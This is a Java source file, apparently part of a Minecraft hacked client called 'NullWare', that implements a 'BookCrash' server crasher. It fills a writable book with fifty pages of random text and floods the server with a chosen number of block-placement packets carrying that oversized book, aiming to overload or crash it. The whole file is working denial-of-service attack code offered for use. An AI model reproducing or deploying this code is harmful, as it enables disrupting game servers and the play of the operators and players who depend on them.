package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import org.apache.commons.lang3.RandomStringUtils;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class BookCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    private ItemStack createExploitItem() {
        ItemStack itemStack = new ItemStack(Items.writable_book);
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList pages = new NBTTagList();

        for (int i = 0; i < 50; i++) {
            pages.appendTag(new NBTTagString(RandomStringUtils.randomAlphabetic(200)));
        }

        compound.setTag("pages", pages);
        itemStack.setTagCompound(compound);
        return itemStack;
    }

    @Override
    public void execute(int packets) {
        long start = System.currentTimeMillis();
        sendMessage(String.format("Sending &8[&7Method: &d%s&7, Packets: &d%s&8]", "BookPlace", packets));
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(createExploitItem()));
        }
        sendMessage(String.format("Sent &8[&7Method: &d%s&7, Time: &d%sms&8]", "BookPlace", System.currentTimeMillis() - start));
    }
}